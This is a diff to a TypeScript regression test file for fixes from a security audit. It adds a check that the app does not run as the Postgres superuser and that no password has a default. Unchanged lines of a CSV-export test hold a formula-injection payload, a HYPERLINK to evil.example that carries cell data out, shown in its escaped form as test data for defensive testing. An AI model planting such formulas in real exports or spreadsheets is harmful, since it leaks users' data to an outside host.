@@ -1,5 +1,5 @@
 /* Regression tests for SECURITY_AUDIT.md: each one failed before its fix. */
-import { mkdtempSync, rmSync } from 'node:fs';
+import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { eq } from 'drizzle-orm';
@@ -210,6 +210,18 @@ describe('F-08 CSV export', () => {
     expect(cells.filter((c) => /^"[=+\-@]/.test(c))).toEqual([]);
     expect(csv).toContain(`"'=HYPERLINK(""https://evil.example/?""&H2,""x"")"`);
     expect(csv).toContain(`"'@SUM(1+1)"`);
+  });
+});
+
+describe('F-09 database role', () => {
+  it('the app does not connect as the Postgres superuser, and no password has a default', () => {
+    const compose = readFileSync(new URL('../../docker-compose.yml', import.meta.url), 'utf8');
+    const superuser = /POSTGRES_USER:\s*(\S+)/.exec(compose)![1];
+    const appUser = /DATABASE_URL:\s*postgres:\/\/([^:]+):/.exec(compose)![1];
+    expect(appUser).not.toBe(superuser);
+    expect(compose).toContain('/docker-entrypoint-initdb.d/');
+    expect(compose).not.toMatch(/PASSWORD:-/);
+    expect(readFileSync(new URL('../../docker/db-init.sh', import.meta.url), 'utf8')).toMatch(/CREATE ROLE mrak8 .*NOSUPERUSER/);
   });
 });
 
